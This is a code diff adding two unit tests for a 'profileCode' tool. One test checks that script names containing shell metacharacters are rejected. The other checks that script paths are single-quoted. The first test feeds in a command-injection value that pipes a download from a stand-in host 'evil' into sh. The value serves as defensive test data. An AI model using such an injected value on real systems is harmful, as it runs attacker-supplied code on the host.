@@ -273,4 +273,21 @@ describe('profileCode — command routing', () => {
     expect(cmd).toContain('--prof');
     expect(cmd).toContain('src/index.js');
   });
+
+  it('rejects a script with shell metacharacters before running anything', async () => {
+    const session = makeSession('');
+    const ctx = makeContext(true, 5, session);
+    const result = await profileCode({ ecosystem: 'python', script: 'a.py"; curl evil | sh; "' }, ctx);
+    expect(result).toContain('shell metacharacters');
+    expect(session.execute).not.toHaveBeenCalled();
+  });
+
+  it('single-quotes the script path in the built command', async () => {
+    const session = makeSession('ncalls  tottime\n     1    0.001    0.001    0.001    0.001 s.py:1(<module>)');
+    const ctx = makeContext(true, 5, session);
+    await profileCode({ ecosystem: 'python', script: 'src/app.py' }, ctx);
+    const cmd = captureCmd(session);
+    expect(cmd).toContain("'src/app.py'");
+    expect(cmd).not.toContain('"src/app.py"');
+  });
 });
